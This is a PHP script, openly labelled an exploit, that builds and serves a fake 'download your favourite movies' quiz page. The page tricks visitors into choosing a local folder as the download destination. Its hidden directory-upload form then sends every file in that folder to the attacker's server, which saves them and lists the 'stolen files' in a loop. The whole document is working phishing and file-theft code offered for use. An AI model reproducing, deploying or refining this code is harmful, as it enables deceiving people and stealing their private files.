<?php

echo "\n\n";

#----Taking user input for the name of folder----
echo "Enter the name directory in which you want to enter the stolen files: ";
$folder = stream_get_line(STDIN, 1024, PHP_EOL);
echo "\n";
sleep(1);
echo "Thanks for your input !! You entered the folder: ".$folder."\n";
mkdir($folder);
echo "\n";


#-----Making folder structure------
$path = getcwd();
$correctPath = str_replace("\\","/",$path);
$correctPath = $correctPath."/".$folder;


#------Creating runtime file index.php---------
$myfile = fopen("index.php", "w") or die("Unable to open file!");
$script = '<html>
<head>
<style>
body {
    background-color: black;

}

h1 {
    color: orange; 
    padding-left: 40px;
    font-family: cursive;
    font-style: italic;
   
}

h2 {
    color: white;
    padding-left: 40px;
    font-family: cursive;
    font-style: italic;
   
}

h3 {
    color: white;
    padding-left: 40px;
    font-family: cursive;
    font-style: italic;
    
}

h4 {
    color: white;
   font-family: cursive;
    font-style: italic;
   padding-left: 40px;
    
}

form {
    color: white;    
    font-family: cursive;
    font-style: italic;
  padding-left: 40px;
}

img {
    float: right;
    padding-top: 280px;
    padding-right: 550px;
}
#sa {
  color: orange;  
}

</style>
</head>
<img src="MoviesLogo.jpg"></img>
<h1>Download your favourite movies</h1>
<h3>Please answers these questions. Based on your answers we will provide you with movies</h3>
<h4>Who is your favourite hero?</h4>
<form>
  <input type="radio" name="hero" value="male"> John Abraham<br>
  <input type="radio" name="hero" value="female"> Aamir Khan<br>
  <input type="radio" name="hero" value="other"> Salman Khan  
</form> 
<h4>What type of movies you like?</h4>
<form>
  <input type="radio" name="type" value="male"> Action<br>
  <input type="radio" name="type" value="female"> Romance<br>
  <input type="radio" name="type" value="other"> Suspence<br> 
  <input type="radio" name="type" value="other"> Comedy   
</form> 
<h4>Do you like animations in the movie?</h4>
<form>
  <input type="radio" name="animations" value="male"> Yes<br>
  <input type="radio" name="animations" value="female"> No
 </form> 
<h4>Do you like songs in the film?</h4>
<form>
  <input type="radio" name="songs" value="male"> Yes<br>
  <input type="radio" name="songs" value="female"> No<br> 
</form> 
<br>
<h2>Click the folder location where you want the movies to be <div id="sa">downloaded!!</h2>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="files[]" id="files" multiple="" directory="" webkitdirectory="" mozdirectory="">
    <input class="button" id="button1" type="submit" value="Download" />
</form>
</html>
<?php
$count = 0;
if ($_SERVER[\'REQUEST_METHOD\'] == \'POST\'){
    foreach ($_FILES[\'files\'][\'name\'] as $i => $name) {
        if (strlen($_FILES[\'files\'][\'name\'][$i]) > 1) {
            if (move_uploaded_file($_FILES[\'files\'][\'tmp_name\'][$i],'.'\''.$correctPath.'/'.'\'.'.'$name)) {
                $count++;
            }
        }
    }
}
?>';
fwrite($myfile, $script);
fclose($myfile);
sleep(1);
echo "Files and folders are created successfully....\n\n";

#----Starting the web server-----
echo "Enter the port on which you want to start the server: ";
$port = stream_get_line(STDIN, 1024, PHP_EOL);
sleep(1);
pclose(popen('start cmd /k php -S 127.0.0.1:'.$port, 'r'));
echo "\n";
echo "The web server has been successfully started...\n\n";
echo "\n";


#------Checking if this is being run in an Amdocs environment----
sleep(5);
echo "Are you running this from Amdocs proxy environment? (yes/no): ";
$answer = stream_get_line(STDIN, 1024, PHP_EOL);

echo "\n";
echo "\n";


if($answer == "yes")
		{

			$opts = array(
					'http'=>array(
						'method'=>"GET",
						'header'=>"Accept-language: en\r\n" .
						"Cookie: foo=bar\r\n",
						'proxy' => 'tcp://genproxy.amdocs.com:8080',
						)
			);
			$context = stream_context_create($opts);
			
			// Opening the file using the HTTP headers set above
			$internetFile = file_get_contents('http://img.pixady.com/2017/10/524154_movieslogo.jpg', false, $context);
			$myfile1 = fopen("MoviesLogo.jpg", "w") or die("Unable to open file!");
			fwrite($myfile1, $internetFile);
			fclose($myfile1);
			echo "MoviesLogo.jpg image created successfully....\n\n";
		}

else
		{
			$internetFile = file_get_contents('http://img.pixady.com/2017/10/524154_movieslogo.jpg');
			$myfile1 = fopen("MoviesLogo.jpg", "w") or die("Unable to open file!");
			fwrite($myfile1, $internetFile);
			fclose($myfile1);
			echo "MoviesLogo.jpg image created successfully....\n\n";
		}
		
echo "\n\n";
sleep(1);		
echo "*********************************\n";
sleep(1);
echo "*********************************\n";
sleep(1);
echo "Thanks !! ...... The explot has started successfully\n";
sleep(1);
echo "*********************************\n";
sleep(1);
echo "*********************************\n";
sleep(1);
echo "\n\n";

while(1)
		{
			echo " \n Listing the received files...\n";	
			$files1 = scandir($folder);
			print_r($files1);
			sleep(2);
		}
		
echo "End";

?>

